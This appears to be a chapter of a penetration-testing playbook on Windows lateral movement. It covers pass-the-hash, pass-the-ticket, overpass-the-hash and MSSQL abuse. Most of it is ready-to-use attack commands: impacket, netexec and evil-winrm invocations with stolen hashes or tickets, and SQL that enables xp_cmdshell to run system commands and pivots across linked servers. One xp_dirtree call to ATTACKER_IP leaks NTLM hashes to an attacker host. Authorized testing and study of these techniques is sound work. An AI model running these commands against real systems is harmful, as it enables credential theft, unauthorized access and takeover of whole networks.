---
title: "11 · Lateral Movement"
---

# 11 · Lateral Movement

> Use one set of compromised creds to access more machines.

!!! note "Phase overview"
    Once you have a hash, ticket, or password, the question becomes: where else can I use it? PtH and PtT are the bread and butter; OPTH (overpass-the-hash) converts an NT hash into a usable Kerberos ticket; MSSQL is the underrated lateral path because xp_cmdshell + SeImpersonate often gives you SYSTEM in one hop.

### 11.1 · Pass the Hash

!!! info "Why this works / how it chains"

    `NTLM` authentication doesn't need a cleartext password; the NT hash IS the secret. Tools like netexec, evil-winrm, and impacket-{psexec,wmiexec,smbexec} all accept hashes via -H or -hashes. Local administrator hash + --local-auth tries against the local SAM rather than the domain.

```bash title="PtH on every protocol"
# Some examples:

nxc smb <IP>/24 -u administrator -H <HASH> --local-auth

evil-winrm -i <IP> -u administrator -H <HASH>

impacket-psexec domain.local/administrator@<IP> -hashes :<HASH>

impacket-wmiexec domain.local/administrator@<IP> -hashes :<HASH>

impacket-smbexec domain.local/administrator@<IP> -hashes :<HASH>
```


### 11.2 · Pass the Ticket

!!! info "Why this works / how it chains"

    When you have a Kerberos ticket file (.ccache), set KRB5CCNAME and use any tool with -k -no-pass. Tickets are time-limited (default 10 hours) so check expiry with klist.

```bash title="PtT"
export KRB5CCNAME=/path/to/ticket.ccache

impacket-psexec -k -no-pass domain.local/user@target

impacket-wmiexec -k -no-pass domain.local/user@target
```


### 11.3 · Overpass the Hash

!!! info "Why this works / how it chains"

    Convert an NT hash into a TGT, then use the TGT for tools that only support Kerberos (or to access services where NTLM is blocked). The NT hash is used as the user's long-term Kerberos key.

```bash title="Hash → TGT"
impacket-getTGT domain.local/user -hashes :<HASH> -dc-ip <IP>

export KRB5CCNAME=user.ccache
```


### 11.4 · MSSQL Abuse

!!! info "Why this works / how it chains"

   `MSSQL` is the most overlooked lateral path. Login with Windows auth ***`(-windows-auth)`***, check if you're sysadmin, ***`enable xp_cmdshell`***, run commands. The MSSQL service account almost always has SeImpersonatePrivilege, so xp_cmdshell + GodPotato (Phase 12.1) = SYSTEM. Linked servers chain across DBs and even across forests.

```bash title="Login (password or Kerberos)"
# Some examples:

impacket-mssqlclient domain.local/user:pass@<IP> -windows-auth

# With Kerberos
KRB5CCNAME=user.ccache faketime '-7 seconds' \
  proxychains4 -q impacket-mssqlclient -k -no-pass \
  -dc-ip <DC_IP> dc.domain.local
```

```sql title="Enable xp_cmdshell + execute"
-- Some examples:

-- Check role
SELECT SYSTEM_USER;
SELECT IS_SRVROLEMEMBER('sysadmin');

-- Enable xp_cmdshell
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;

-- Execute commands
EXEC xp_cmdshell 'whoami /priv';
-- If SeImpersonatePrivilege → Potato attack!

-- Capture NTLM hash (with Responder)
EXEC xp_dirtree '\\ATTACKER_IP\share';

-- Check linked servers
SELECT * FROM sys.servers;
EXEC ('xp_cmdshell ''whoami''') AT [linkedserver];
```

